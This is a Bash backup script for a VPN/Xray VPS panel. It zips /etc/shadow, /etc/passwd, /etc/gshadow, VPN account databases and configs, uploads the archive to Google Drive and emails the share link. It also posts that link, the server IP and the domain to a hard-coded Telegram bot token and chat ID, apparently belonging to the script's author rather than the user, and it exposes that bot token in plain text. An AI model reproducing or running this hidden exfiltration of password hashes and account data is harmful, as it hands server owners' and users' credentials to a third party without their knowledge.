#!/bin/bash
# My Telegram : https://t.me/sampiiiiu
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
export CHATID="7114686701"
export KEY="7291232496:AAECM92Z4en7a1xCaUuvITHBgamVi-C9Irs"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain)
date=$(date +"%Y-%m-%d")
clear
email=$(cat /root/email)
if [[ "$email" = "" ]]; then
echo "Masukkan Email Untuk Menerima Backup"
read -rp "Email : " -e email
cat <<EOF>>/root/email
$email
EOF
fi
clear
echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp /etc/crontab backup/
cp /etc/vmess/.vmess.db backup/
cp /etc/ssh/.ssh.db backup/
cp /etc/vless/.vless.db backup/
cp /etc/trojan/.trojan.db backup/
cp /etc/bot/.bot.db backup/
cp -r /etc/kyt/limit backup/
cp -r /etc/limit backup/qt/
cp -r /etc/vmess backup/
cp -r /etc/trojan backup/
cp -r /etc/vless backup/
cp -r /etc/noobzvpns backup/noobzvpns
cp -r /var/lib/kyt/ backup/kyt 
cp -r /etc/xray backup/xray
cp -r /var/www/html/ backup/html
cd /root
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}"
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data" $email
rm -rf /root/backup
rm -r /root/$IP-$date.zip
clear
CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="◇━━━━━━━━━━━━━━◇
<b>   ⚠️BACKUP NOTIF⚠️</b>
<b>     Detail Backup VPS</b>
◇━━━━━━━━━━━━━━◇
<b>IP VPS  :</b> ${IP} 
<b>DOMAIN  :</b> ${domain}
<b>Tanggal : $date</b>
◇━━━━━━━━━━━━━━◇
<b>Link Backup   :</b> $link
◇━━━━━━━━━━━━━━◇
Silahkan copy Link dan restore di VPS baru
BY BOT : @AimanVpnExpress
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
Domain        : $domain
==================================
"
echo "Silahkan copy Link dan restore di VPS baru"
echo ""
